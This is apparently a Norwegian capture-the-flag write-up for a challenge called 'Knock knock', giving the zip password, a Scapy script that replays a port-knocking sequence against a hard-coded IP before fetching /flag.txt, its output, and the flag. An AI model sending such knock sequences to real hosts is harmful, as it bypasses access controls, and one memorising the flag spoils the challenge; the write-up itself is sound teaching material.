# Knock knock

Analyser og reproduser en PCAP-fil for å finne flagget.

Passordet til zip-filen er: `skattctf`

[⬇️ knock.zip](./knock.zip)

# Writeup

Ein les i PCAP-fila kva trafikk som har gått til endepunktet. Og så må ein berre gjenta det. Scriptet må køyrast som root.

## Kode
```python
from scapy.all import *
import requests

target = "51.21.244.79"
ip = IP(dst=target)

send(IP(dst=target)/TCP(dport=80,sport=20, flags='S'))
send(IP(dst=target)/TCP(dport=443,sport=20, flags='S'))
send(IP(dst=target)/UDP(dport=2222, sport=53))
send(IP(dst=target)/TCP(dport=3333, sport=20, flags='S'))
send(IP(dst=target)/UDP(dport=4444, sport=53))

r = requests.get("http://" + target + "/flag.txt", timeout=15)
print(r.text)
```

## Output

```bash
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
skatt{kn0cking_for_0bscur!ty}
```

# Flag

```
skatt{kn0cking_for_0bscur!ty}
```